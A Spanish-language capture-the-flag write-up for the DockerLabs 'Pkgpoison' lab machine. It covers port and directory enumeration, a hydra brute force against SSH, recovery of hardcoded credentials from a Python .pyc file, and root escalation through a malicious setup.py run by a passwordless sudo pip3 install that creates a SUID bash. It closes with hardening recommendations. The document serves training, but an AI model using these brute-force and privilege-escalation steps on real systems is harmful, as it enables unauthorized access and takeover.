# Writeup Pkgpoison - DockerLabs

<p align="center">
  <img src="https://img.shields.io/badge/Platform-DockerLabs-blue?style=for-the-badge&logo=docker" alt="DockerLabs">
  <img src="https://img.shields.io/badge/Difficulty-Easy%2FMederate-orange?style=for-the-badge" alt="Difficulty">
  <img src="https://img.shields.io/badge/OS-Linux-lightgrey?style=for-the-badge&logo=linux" alt="OS: Linux">
</p>

**Pkgpoison** es una máquina virtual de DockerLabs diseñada para practicar técnicas de enumeración web, fuerza bruta de credenciales, análisis de archivos binarios/bytecode de Python (.pyc) y abuso de privilegios `sudo` mediante `pip` (GTFOBins).

---

## 1. Despliegue del Entorno

Para inicializar la máquina vulnerable proporcionada por DockerLabs, descomprimimos el archivo comprimido y ejecutamos el script de despliegue con privilegios de administrador.

```bash
unzip pkgpoison.zip
sudo bash auto_deploy.sh pkgpoison.tar
```

```text
[sudo] password for user: 

DOCKERLABS
Estamos desplegando la máquina vulnerable, espere un momento.
Máquina desplegada, su dirección IP es --> 172.17.0.2
Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

---

## 2. Reconocimiento y Enumeración

### Escaneo de Puertos con Nmap
Comenzamos realizando un escaneo de puertos abiertos con `nmap` para identificar los servicios expuestos en la máquina objetivo (`172.17.0.2`).

```bash
nmap -p- --open -sS --min-rate 5000 -v -n -Pn 172.17.0.2
```

```text
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 172.17.0.2
Host is up (0.000032s latency).
Not shown: 998 closed tcp ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Para obtener más detalles sobre las versiones de los servicios detectados, lanzamos un escaneo de versiones y scripts por defecto (`-sCV`):

```bash
nmap -sCV -p 22,80 172.17.0.2
```

### Enumeración Web con Gobuster
Utilizamos `gobuster` para descubrir directorios ocultos en el servidor web HTTP (puerto 80).

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

```text
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
/index.html          (Status: 200) [Size: 589]
/notes               (Status: 301) [Size: 308]
===============================================================
```

Al navegar al directorio `/notes/`, encontramos un archivo llamado `note.txt` que contiene un aviso de seguridad y credenciales débiles orientadas al usuario `dev`:

```text
Dear developer,
Please remember to change your credentials "dev:developer123" to something stronger.
I've already warned you that weak passwords can get us compromised.
-Admin
```

Aunque se mencionan las credenciales `dev:developer123`, al intentar conectarse directamente por SSH nos percatamos de que han sido modificadas o no son válidas.

---

## 3. Fuerza Bruta de Credenciales (Hydra)

Dado que las credenciales por defecto fallaron, realizamos un ataque de fuerza bruta contra el servicio SSH utilizando `hydra` y el diccionario clásico `rockyou.txt`.

```bash
hydra -l dev -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 60
```

```text
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak
[DATA] max 60 tasks per 1 server, overall tasks 60, 1434439 passwords (1 total)
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: dev   password: <password_encontrada>
[STATUS] attack finished for 172.17.0.2
```

Una vez obtenida la contraseña correcta, iniciamos sesión mediante SSH como el usuario `dev`:

```bash
ssh dev@172.17.0.2
```

---

## 4. Análisis de Bytecode Python (.pyc)

Una vez dentro del sistema como el usuario `dev`, exploramos el directorio `/opt` en busca de scripts o archivos interesantes. Encontramos un directorio de scripts que contiene un archivo compilado de Python (`.pyc`).

```bash
cd /opt/scripts
ls -la
```

Como el archivo `.pyc` es un binario compilado, no se puede leer directamente con `cat`. Utilizamos el comando `strings` para extraer cadenas de texto legibles:

```bash
strings secret.cpython-38.pyc
```

```text
adminz
p@$$w0r83212
Authenticating...
print
username
password
secret.py
auth
<module>
```

El análisis revela un posible nombre de usuario (`admin`) y una contraseña (`p@$$w0r83212`, ajustando el último carácter). Probamos cambiar de usuario o iniciar sesión con estas credenciales:

```bash
su admin
```

---

## 5. Escalada de Privilegios a Root (Abuso de Pip3)

Una vez autenticados como el usuario `admin`, evaluamos los permisos de ejecución mediante `sudo` para identificar vectores de escalada de privilegios.

```bash
sudo -l
```

```text
Matching Defaults entries for admin on 5713bbdb57ce:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User admin may run the following commands on admin:
    (ALL) NOPASSWD: /usr/bin/pip3 install *
```

El usuario `admin` puede ejecutar `pip3 install` con privilegios de root sin contraseña sobre cualquier ruta. Esto nos permite aplicar una técnica de GTFOBins para empaquetar un script de Python malicioso que duplique una bash con permisos SUID.

### Creación del Paquete Malicioso

Creamos un directorio temporal y un archivo `setup.py` que copiará la shell de Bash otorgándole permisos SUID (`4755`).

```bash
TF=$(mktemp -d)
cat << 'EOF' > $TF/setup.py
from setuptools import setup
import os

os.system('cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash')

setup(
    name='exploit',
    version='1.0'
)
EOF
```

### Ejecución de la Instalación con Sudo

A continuación, utilizamos el binario `pip3` autorizado mediante `sudo` para instalar el paquete creado en la carpeta temporal:

```bash
sudo /usr/bin/pip3 install $TF/
```

```text
Processing /tmp/tmp.62LqBSkeRm
Building wheels for collected packages: exploit
  Building wheel for exploit (setup.py) ... done
  Created wheel for exploit: filename=exploit-1.0-py3-none-any.whl size=972 ...
Successfully built exploit
Installing collected packages: exploit
Successfully installed exploit-1.0
```

### Obtención de la Shell de Root

Una vez completada la instalación, el archivo `/tmp/rootbash` se habrá generado con los permisos correctos. Lo ejecutamos con el parámetro `-p` para conservar los privilegios de root:

```bash
/tmp/rootbash -p
```

Verificamos nuestra identidad dentro del sistema:

```bash
whoami
id
```

```text
root
uid=1001(admin) gid=1001(admin) euid=0(root) egid=0(root) groups=0(root),1001(admin)
```

¡Listo! Hemos obtenido acceso total como `root` en la máquina virtual.

---

## 6. Conclusiones y Recomendaciones

* **Contraseñas Débiles:** Se debe evitar el almacenamiento de credenciales predeterminadas o débiles susceptibles a ataques de fuerza bruta (Hydra).
* **Gestión de Archivos Sensibles:** Los scripts de Python compilados (`.pyc`) o archivos de configuración no deben contener credenciales en texto plano accesibles para usuarios de bajos privilegios.
* **Control de Permisos Sudo:** Otorgar permisos desatendidos (`NOPASSWD`) a utilidades de gestión de paquetes como `pip`, `npm` o gestores similares permite a un atacante ejecutar código arbitrario con privilegios elevados aprovechando configuraciones conocidas (GTFOBins).